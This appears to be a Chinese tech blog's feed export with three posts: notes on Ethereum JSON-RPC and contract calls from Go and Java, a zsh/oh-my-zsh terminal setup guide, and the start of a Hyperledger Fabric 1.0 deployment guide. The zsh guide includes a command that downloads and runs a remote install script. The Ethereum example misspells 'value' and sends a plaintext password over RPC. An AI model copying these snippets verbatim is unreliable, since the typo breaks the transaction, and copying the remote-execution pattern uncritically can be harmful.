"dee5ca0b-8be5-4705-94a0-cab3659df089"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>personal_sendTransaction</strong><br>发送未签名交易，但附带上账户的密码。</p><p>这种交易构造起来是这样的，<code>123456</code> 是账户密码：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"jsonrpc"</span>: <span class="string">"2.0"</span>,</span><br><span class="line">  <span class="attr">"method"</span>: <span class="string">"personal_sendTransaction"</span>,</span><br><span class="line">  <span class="attr">"params"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"from"</span>: <span class="string">"0x25976d6ab66b5d99d71fce5c4b9273e66d642713"</span>,</span><br><span class="line">      <span class="attr">"to"</span>: <span class="string">"0x0236fB10031eCc5aF22E5bAE45fEb1Eb555DCAee"</span>,</span><br><span class="line">      <span class="attr">"vaule"</span>: <span class="string">"1000000000000000000"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"123456"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Mist 是通过这种方式发起交易的。<code>personal_sendTransaction</code> 并不能用在高并发上，因为节点解锁账号需要消耗大量时间。</p><h3 id="go-开发说明"><a href="#go-开发说明" class="headerlink" title="go 开发说明"></a>go 开发说明</h3><p>因为 go-ethereum 以太坊客户端使用 go 语言编写，因此可以直接借鉴 go-ethereum 中调用智能合约的方法来用。</p><p><strong>使用 abigen 工具可以把 Solidity 写的智能合约编译成 go 语言文件，然后就可以使用了。</strong></p><p>参照 <a href="https://github.com/ethereum/go-ethereum/wiki/Native-DApps:-Go-bindings-to-Ethereum-contracts" target="_blank" rel="noopener">https://github.com/ethereum/go-ethereum/wiki/Native-DApps:-Go-bindings-to-Ethereum-contracts</a></p><p>会用到：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"github.com/ethereum/go-ethereum/ethclient"</span></span><br><span class="line"><span class="string">"github.com/ethereum/go-ethereum/accounts/abi/bind"</span></span><br></pre></td></tr></table></figure><p>ethclient 可用于连接以太坊节点，RPC 或 IPC 都能用，用法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn, err := ethclient.Dial(<span class="string">"http://localhost:8545/"</span>) 或</span><br><span class="line">conn, err := ethclient.Dial(<span class="string">"/home/user/.ethereum/testnet/geth.ipc"</span>)</span><br></pre></td></tr></table></figure><p>然后在 abigen 生成的 <code>xxx.go</code> 合约中可以看到合约名字 <code>XXX</code>。利用合约名子、合约地址、keystore 和密码去调用合约，发起交易：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract, err := XXX(common.HexToAddress(<span class="string">"合约地址"</span>), conn)</span><br><span class="line"># 如果只是调用合约查询，不发起交易，可以不用这一步</span><br><span class="line">auth, err := bind.NewTransactor(strings.NewReader(keystore), <span class="string">"password"</span>)</span><br></pre></td></tr></table></figure><p>利用这个 contract 和 auth 就可以调用合约了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果只是调用合约查询，不发起交易，不用 auth 参数</span><br><span class="line">trans, err := contract.合约方法名(auth, 合约方法的参数)</span><br></pre></td></tr></table></figure><blockquote><p>注意！<br>本质上，go 的使用方法也是调用了 JSON-RPC。调用合约封装了 <code>eth_sendRawTransaction</code> 方法。这个方法比 <code>eth_sendTransaction</code> 复杂一些，调用之前会自行处理 nonce、gasPrice、gasLimit 等参数。nonce 这个参数使用 <code>eth_getTransactionCount</code> 方法获取（参数为账号地址和 “pending”）。这就会导致一个问题，<strong>当一个账号刚刚提交了一个交易，该账号立刻又要发起另一笔交易时，上一笔交易还未被 “pending” ，此时 <code>eth_getTransactionCount</code> 的结果不变，导致构造新交易的 nonce 和上一笔交易 nonce 相同。会提示 “replacement transaction underpriced” 这种错误。</strong>而使用<br> JSON-RPC 的 <code>eth_sendTransaction</code> 或 <code>personal_sendTransaction</code> 不会出现这个问题。Mist 即使用的后者。</p></blockquote><h3 id="Node-开发说明"><a href="#Node-开发说明" class="headerlink" title="Node 开发说明"></a>Node 开发说明</h3><p>web3js 库封装了 JSON-RPC API。只需要知道合约 ABI 和合约地址，就可以很方便地调用合约。</p><h3 id="Java-Android-开发说明"><a href="#Java-Android-开发说明" class="headerlink" title="Java / Android 开发说明"></a>Java / Android 开发说明</h3><p>web3j 封装了 JSON-RPC API。合约操作也有捷径，把 Solidity 合约编译成 Java 类去使用。</p><ul><li>安装 Solidity 编译工具 solc</li><li>下载 web3j 工具 <a href="https://github.com/web3j/web3j" target="_blank" rel="noopener">https://github.com/web3j/web3j</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 把合约 test.sol 编译为 bin 和 abi 文件, 输出到当前目录下的 output 文件夹中</span><br><span class="line">solc test.sol --bin --abi --optimize -o ./output</span><br><span class="line"># 使用 web3j 生成 java 合约, 输出目录 ./src/main/java</span><br><span class="line">./web3j solidity generate ./output/test.bin ./output/test.abi -o ./src/main/java -p com.your.organisation.name</span><br></pre></td></tr></table></figure><h2 id="0x03-关于"><a href="#0x03-关于" class="headerlink" title="0x03 关于"></a>0x03 关于</h2><p>区块链参考资料 <a href="https://github.com/gymgle/blockchain-reference" target="_blank" rel="noopener">https://github.com/gymgle/blockchain-reference</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;甩锅提醒：本文更新于 &lt;code&gt;2018.3.31&lt;/code&gt;，未来这些内容肯定会过时，务必善用搜索引擎去获取知识和技能。本文内容杂多，可能需要对区块链有一些深入了解的同学才能看懂。&lt;/p&gt;
&lt;h2 id=&quot;0x00-一些-Tips&quot;&gt;&lt;a href=&quot;#0x00-一些
      
    
    </summary>
    
    
      <category term="ethereum" scheme="https://g2ex.top/tags/ethereum/"/>
    
      <category term="bitcoin" scheme="https://g2ex.top/tags/bitcoin/"/>
    
      <category term="blockchain" scheme="https://g2ex.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>终端折腾记</title>
    <link href="https://g2ex.top/2018/01/21/linux-terminal-zsh-notes/"/>
    <id>https://g2ex.top/2018/01/21/linux-terminal-zsh-notes/</id>
    <published>2018-01-21T22:32:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最新更新时间 2019-06-20</p></blockquote><h2 id="Oh-My-Zsh-安装"><a href="#Oh-My-Zsh-安装" class="headerlink" title="Oh-My-Zsh 安装"></a>Oh-My-Zsh 安装</h2><p>前提是需要安装 <code>zsh</code> <code>git</code> <code>curl</code> ：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh curl git</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>比较推荐的插件如下，需要修改 <code>~/.zshrc</code> 配置文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  z</span><br><span class="line">  extract</span><br><span class="line">  zsh-autosuggestions     <span class="comment"># 需要自己安装</span></span><br><span class="line">  zsh-syntax-highlighting <span class="comment"># 需要自己安装</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为 oh-my-zsh 安装 zsh-autosuggestions：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>为 oh-my-zsh 安装 zsh-syntax-highlighting：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><h2 id="Oh-My-Zsh-的主题"><a href="#Oh-My-Zsh-的主题" class="headerlink" title="Oh-My-Zsh 的主题"></a>Oh-My-Zsh 的主题</h2><p>我更偏爱 <code>powerlevel9k</code> 主题，可以定制的地方很多 <a href="https://github.com/bhilburn/powerlevel9k" target="_blank" rel="noopener">https://github.com/bhilburn/powerlevel9k</a></p><p>但是，<code>powerlevel9k</code> 主题对字体的配置比较麻烦，如果使用这个主题，一定要配置好下面提到的 <strong>必需的字体</strong>。</p><p>主题安装 <a href="https://github.com/bhilburn/powerlevel9k/wiki/Install-Instructions#step-1-install-powerlevel9k" target="_blank" rel="noopener">https://github.com/bhilburn/powerlevel9k/wiki/Install-Instructions#step-1-install-powerlevel9k</a></p><p>为 Oh-My-ZSH 安装主题：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k</span><br></pre></td></tr></table></figure><p><code>powerlevel9k</code> 字体的说明 <a href="https://github.com/bhilburn/powerlevel9k/wiki/Install-Instructions#step-2-install-a-powerline-font" target="_blank" rel="noopener">https://github.com/bhilburn/powerlevel9k/wiki/Install-Instructions#step-2-install-a-powerline-font</a></p><p>我的简单配置 <code>~/.zshrc</code> ：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POWERLEVEL9K_BACKGROUND_JOBS_FOREGROUND=<span class="string">'black'</span></span><br><span class="line">POWERLEVEL9K_BACKGROUND_JOBS_BACKGROUND=<span class="string">'178'</span></span><br><span class="line">POWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND=<span class="string">"blue"</span></span><br><span class="line">POWERLEVEL9K_DIR_WRITABLE_FORBIDDEN_FOREGROUND=<span class="string">"255"</span></span><br><span class="line">POWERLEVEL9K_DIR_WRITABLE_FORBIDDEN_BACKGROUND=<span class="string">"red"</span></span><br><span class="line"></span><br><span class="line">POWERLEVEL9K_COMMAND_EXECUTION_TIME_THRESHOLD=0</span><br><span class="line">POWERLEVEL9K_TIME_BACKGROUND=<span class="string">'255'</span></span><br><span class="line">POWERLEVEL9K_COMMAND_EXECUTION_TIME_BACKGROUND=<span class="string">'245'</span></span><br><span class="line">POWERLEVEL9K_COMMAND_EXECUTION_TIME_FOREGROUND=<span class="string">'black'</span></span><br><span class="line"></span><br><span class="line">POWERLEVEL9K_MODE=<span class="string">'awesome-patched'</span></span><br><span class="line">POWERLEVEL9K_SHORTEN_DIR_LENGTH=2</span><br><span class="line">POWERLEVEL9K_SHORTEN_STRATEGY=<span class="string">"truncate_from_right"</span></span><br><span class="line">POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(root_indicator context dir dir_writable vcs)</span><br><span class="line">POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status background_jobs command_execution_time time)</span><br><span class="line">POWERLEVEL9K_PROMPT_ON_NEWLINE=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">"powerlevel9k/powerlevel9k"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 隐藏登录时显示 user@hostname</span></span><br><span class="line"><span class="built_in">export</span> DEFAULT_USER=`whoami`</span><br></pre></td></tr></table></figure><blockquote><p>可以参考以下别人的配置 - Show Off Your Config</p><p><a href="https://github.com/bhilburn/powerlevel9k/wiki/Show-Off-Your-Config" target="_blank" rel="noopener">https://github.com/bhilburn/powerlevel9k/wiki/Show-Off-Your-Config</a></p></blockquote><h2 id="必需的字体"><a href="#必需的字体" class="headerlink" title="必需的字体"></a>必需的字体</h2><p>配置终端字体是问题最多的一个步骤。如果直接使用 oh-my-zsh 的默认主题，只用安装 Powerline 字体即可。对于想要使用看起来更酷一点 <code>powerlevel9k</code> 主题，配置要复杂一些。在 Ubuntu 16.04 时，依次按照以下步骤可以正常配置。但在 Ubuntu 18.04 后，以及 Mint 19 以后的版本，参照下一节。</p><h3 id="Ubuntu-16-04"><a href="#Ubuntu-16-04" class="headerlink" title="Ubuntu 16.04"></a>Ubuntu 16.04</h3><p>安装 Powerline 字体，参照 <a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">https://github.com/powerline/fonts</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clone</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/powerline/fonts.git --depth=1</span><br><span class="line"><span class="comment"># install</span></span><br><span class="line"><span class="built_in">cd</span> fonts</span><br><span class="line">./install.sh</span><br><span class="line"><span class="comment"># clean-up a bit</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">rm -rf fonts</span><br></pre></td></tr></table></figure><p>如果后续使用的主题要显示图形符号，则需要 <code>Awesome-Terminal Fonts</code>。推荐安装 Patched 类型，虽然只有三个字体，不过有 <code>Droid+Sans+Mono+Awesome.ttf</code> 已经足够了。</p><p>Patched 字体下载： <a href="https://github.com/gabrielelana/awesome-terminal-fonts/tree/patching-strategy/patched" target="_blank" rel="noopener">https://github.com/gabrielelana/awesome-terminal-fonts/tree/patching-strategy/patched</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把下载的三个 Patched 字体放到个人字体目录中</span></span><br><span class="line">mv *.ttf ~/.<span class="built_in">local</span>/share/fonts/</span><br><span class="line"><span class="comment"># 更新字体缓存</span></span><br><span class="line"><span class="built_in">fc</span>-cache -vf ~/.<span class="built_in">local</span>/share/fonts/</span><br></pre></td></tr></table></figure><h3 id="Ubuntu-18-04-及以后"><a href="#Ubuntu-18-04-及以后" class="headerlink" title="Ubuntu 18.04 及以后"></a>Ubuntu 18.04 及以后</h3><p>Mint 19 以及 Ubuntu 18.04 之后的版本，Terminal 里是无法选择 <code>awesome-patched</code> 字体的，这样的结果是一些图形字体无法显示。</p><p>解决办法是安装这几个字体 <a href="https://github.com/gabrielelana/awesome-terminal-fonts/tree/master/fonts" target="_blank" rel="noopener">https://github.com/gabrielelana/awesome-terminal-fonts/tree/master/fonts</a> 并在 .zshrc 配置文件中把 POWERLEVEL9K 的 MODE 改为 <code>awesome-fontconfig</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POWERLEVEL9K_MODE=<span class="string">'awesome-fontconfig'</span></span><br></pre></td></tr></table></figure><h3 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h3><p>Powerline 字体已经很久没有更新了，我现在已经开始使用 nerd 字体了，nerd 字体包含的图形符号更加丰富，比如不同 git 仓库的项目在路径中显示出的标识也不同，github 项目是 github 风格的小猫，gitlab 项目是的 gitlab logo。</p><p>在 macOS 中安装 nerd 字体非常方便，使用 brew 即可，比如下面是我选择安装的 nerd 字体：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">brew cask install \</span><br><span class="line">  font-dejavusansmono-nerd-font font-dejavusansmono-nerd-font-mono \</span><br><span class="line">  font-droidsansmono-nerd-font font-droidsansmono-nerd-font-mono \</span><br><span class="line">  font-hack-nerd-font font-hack-nerd-font-mono \</span><br><span class="line">  font-inconsolata-nerd-font font-inconsolata-nerd-font-mono \</span><br><span class="line">  font-meslo-nerd-font font-meslo-nerd-font-mono \</span><br><span class="line">  font-sourcecodepro-nerd-font font-sourcecodepro-nerd-font-mono</span><br></pre></td></tr></table></figure><p>如果非要安装 Powerline 字体，也可以使用 brew 快速安装，比如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">brew cask install \</span><br><span class="line">  font-anonymous-pro \</span><br><span class="line">  font-dejavu-sans-mono-for-powerline \</span><br><span class="line">  font-droid-sans \</span><br><span class="line">  font-droid-sans-mono font-droid-sans-mono-for-powerline \</span><br><span class="line">  font-meslo-lg font-input \</span><br><span class="line">  font-inconsolata font-inconsolata-for-powerline \</span><br><span class="line">  font-liberation-mono font-liberation-mono-for-powerline \</span><br><span class="line">  font-liberation-sans \</span><br><span class="line">  font-meslo-lg \</span><br><span class="line">  font-nixie-one \</span><br><span class="line">  font-office-code-pro \</span><br><span class="line">  font-pt-mono \</span><br><span class="line">  font-raleway font-roboto \</span><br><span class="line">  font-source-code-pro font-source-code-pro-for-powerline \</span><br><span class="line">  font-source-sans-pro \</span><br><span class="line">  font-ubuntu font-ubuntu-mono-powerline</span><br></pre></td></tr></table></figure><h2 id="关于终端主题"><a href="#关于终端主题" class="headerlink" title="关于终端主题"></a>关于终端主题</h2><p>macOS 的 iterm2 主题可以选德古拉配色 <a href="https://draculatheme.com" target="_blank" rel="noopener">https://draculatheme.com</a></p><p>Ubuntu 自带的 Terminal 主题推荐 <a href="https://github.com/Mayccoll/Gogh" target="_blank" rel="noopener">https://github.com/Mayccoll/Gogh</a> 运行 gosh 后从列表里选择自己喜欢的主题下载，去菜单 Terminal -&gt; Change Profile 修改主题。必要时编辑 Preferences，选择 Powerline Awesome 字体。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;最新更新时间 2019-06-20&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Oh-My-Zsh-安装&quot;&gt;&lt;a href=&quot;#Oh-My-Zsh-安装&quot; class=&quot;headerlink&quot; title=&quot;Oh-My-Zsh 安装&quot;&gt;&lt;/
      
    
    </summary>
    
    
      <category term="zsh" scheme="https://g2ex.top/tags/zsh/"/>
    
      <category term="oh-my-zsh" scheme="https://g2ex.top/tags/oh-my-zsh/"/>
    
      <category term="iTerm2" scheme="https://g2ex.top/tags/iTerm2/"/>
    
      <category term="powerline" scheme="https://g2ex.top/tags/powerline/"/>
    
      <category term="themes" scheme="https://g2ex.top/tags/themes/"/>
    
  </entry>
  
  <entry>
    <title>Fabric 1.0 填坑指南</title>
    <link href="https://g2ex.top/2017/11/11/fabric-1.0-guide/"/>
    <id>https://g2ex.top/2017/11/11/fabric-1.0-guide/</id>
    <published>2017-11-11T22:48:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>目前 Fabric 1.0 部署还是比较繁琐，环境搭建过程需要安装的和配置的东西较多，而且容易出错。</p><p>Fabric 从 1.0 beta 版到 1.0 正式版，官方文档也更新了不少。网络上很多中文资料是翻译的较早的官方文档，所以学习 Fabric 一定要参考最新的<a href="https://hyperledger-fabric.readthedocs.io" target="_blank" rel="noopener">官方文档</a>。官方文档中提供了一个名为 <a href="https://github.com/hyperledger/fabric-samples" target="_blank" rel="noopener">fabcar</a> 智能合约的演示，指导我们从构建第一个网络到构建第一个应用。不过这一路从配置环境到合约演示，尤其在 Chinternet 的网络环境下，大大小小的坑有不少。正是因为这些原因，应该有一个对 Fabric 1.0 部署到合约演示的指导性文档，这也是本文的写作目的。初学者请以官方文档为主要学习材料，本文仅作为官方文档之外的参考指导。</p><p>本文使用 Fabric 1.0.4，基于 Ubuntu 16.04 x64，总结 Fabric 部署过程和 fabcar 链码演示过程中需要注意的地方，解释某些步骤使得知其然又能知其所以然，同时给出自己的最佳实践。</p><hr><h2 id="0x01-部署的先决条件"><a href="#0x01-部署的先决条件" class="headerlink" title="0x01 部署的先决条件"></a>0x01 部署的先决条件</h2><h3 id="1-Docker-必需"><a href="#1-Docker-必需" class="headerlink" title="1) Docker [必需]"></a>1) Docker [必需]</h3><p>文档中 <a href="https://hyperledger-fabric.readthedocs.io/en/release/prereqs.html#prerequisites" target="_blank" rel="noopener">Prerequisites</a> 一节，说的是运行 Fabric 的先决条件。因为 Fabric 基于 docker 部署，所以 docker 和 docker-compose 是必须的。同时对它们的版本有要求：</p><blockquote><p>docker - 17.03.0-ce +<br>docker-compose - 1.8 +</p></blockquote><h4 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker CE"></a>安装 Docker CE</h4><p>今年 3 月之后，Docker 17+ 分化成了 CE 社区版和 EE 企业版。和大多数一样，社区版免费使用。在 Ubuntu x64 里安装社区版<strong>推荐使用官方仓库安装</strong>，参考 <a href="https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#set-up-the-repository" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#set-up-the-repository</a></p><p>总结一下，命令分别如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    software-properties-common</span><br><span class="line"></span><br><span class="line"># 添加 Docker 官方 GPG key</span><br><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"># 本地添加 Docker 更新源地址</span><br><span class="line">$ sudo add-apt-repository \</span><br><span class="line">   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><br><span class="line">   $(lsb_release -cs) \</span><br><span class="line">   stable&quot;</span><br><span class="line"></span><br><span class="line"># 安装 Docker CE</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install docker-ce</span><br><span class="line"></span><br><span class="line"># 通过查看版本测试是否安装成功</span><br><span class="line">$ docker --version</span><br></pre></td></tr></table></figure><hr><blockquote><p><strong>给 Docker 加速</strong></p></blockquote><p>如果在国内使用 Docker，推荐使用阿里云的 Docker 加速。登陆阿里云容器镜像服务 <a href="https://cr.console.aliyun.com/#/accelerator" target="_blank" rel="noopener">https://cr.console.aliyun.com/#/accelerator</a> 在加速器页分配了自己的加速器地址。使用以下命令把加速地址写入 Docker 配置文件并重启服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://你的加速地址.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><hr><blockquote><p><strong>Docker 权限问题</strong></p></blockquote><p>安装完成后，如果用普通用户执行 docker 命令，会出现权限问题，需要用 sudo 命令运行。但是出于安全考虑，更好的做法是将需要使用 docker 的用户加入 docker 用户组。命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">建立 docker 组：</span><br><span class="line">$ sudo groupadd docker</span><br><span class="line"></span><br><span class="line">将当前用户加入 docker 组：</span><br><span class="line">$ sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><hr><h4 id="安装-docker-compose"><a href="#安装-docker-compose" class="headerlink" title="安装 docker-compose"></a>安装 docker-compose</h4><p>因为 Fabric 容器使用 docker-compose 编排，所以 docker-compose 是必须的。安装方法参考 <a href="https://docs.docker.com/compose/install/#prerequisites" target="_blank" rel="noopener">https://docs.docker.com/compose/install/#prerequisites</a></p><p>总结一下，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 当前 docker-compose 最新版是 1.17.0</span><br><span class="line">$ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"># 添加可执行权限</span><br><span class="line">$ sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"># 通过查看版本测试是否安装成功</span><br><span class="line">$ docker-compose --version</span><br></pre></td></tr></table></figure><hr><h3 id="2-Golang-非必需"><a href="#2-Golang-非必需" class="headerlink" title="2) Golang [非必需]"></a>2) Golang [非必需]</h3><p>虽然 Prerequisites 中提到了 Golang，但 Golang 并不是必须的。<br>如果是把现成的链码部署到 Fabirc 上，比如 <a href="https://hyperledger-fabric.readthedocs.io/en/release/samples.html" target="_blank" rel="noopener">fabric-samples</a> 中的 fabcar demo 示例，向 Fabric 网络安装和实例化 fabcar 链码的过程是在 docker 容器 cli 中执行的，容器 cli 中已经配置好了 Golang 环境。<br>如果你想在本地编写自己的链码，验证是否能通过编译，则需要本地配置 Golang 环境，版本要求 1.7 +。</p><p>配置 Golang 环境参考 <a href="https://golang.org/doc/install" target="_blank" rel="noopener">https://golang.org/doc/install</a></p><p>总结一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 下载安装包后，root 权限解压至 /usr/local 下：</span><br><span class="line">$ sudo tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz</span><br><span class="line"></span><br><span class="line"># 编辑 /etc/profile 或 $HOME/.profile，在文件最后添加环境变量：</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br><span class="line"></span><br><span class="line"># 编辑 $HOME/.profile 或者 $HOME/.bashrc，添加 go 工作目录环境变量 GOPATH：</span><br><span class="line">export GOPATH=$HOME/workspace/gopath</span><br><span class="line"></span><br><span class="line"># 通过查看版本测试是否安装成功</span><br><span class="line">$ go version</span><br></pre></td></tr></table></figure><hr><h3 id="3-Node-JS-非必需"><a href="#3-Node-JS-非必需" class="headerlink" title="3) Node.JS [非必需]"></a>3) Node.JS [非必需]</h3><p>Node.JS 也不是必需的。<br>Fabric 1.0 提供了 SDK，它封装了与 Fabric 区块链交互的 API，目前功能最全官方最推荐的是 Node.js 版本的 SDK。所以，如果要简单演示 fabcar demo 示例，或者要开发上层应用，需要 Node.js 环境。</p><blockquote><p>目前对 Node.js 的版本要求如下：<br>Node.js - version 6.9.x +（但不支持 7.x）<br>npm - @3.10.10</p></blockquote><p><strong>需要注意的坑</strong></p><p>Node.js 官网最新的 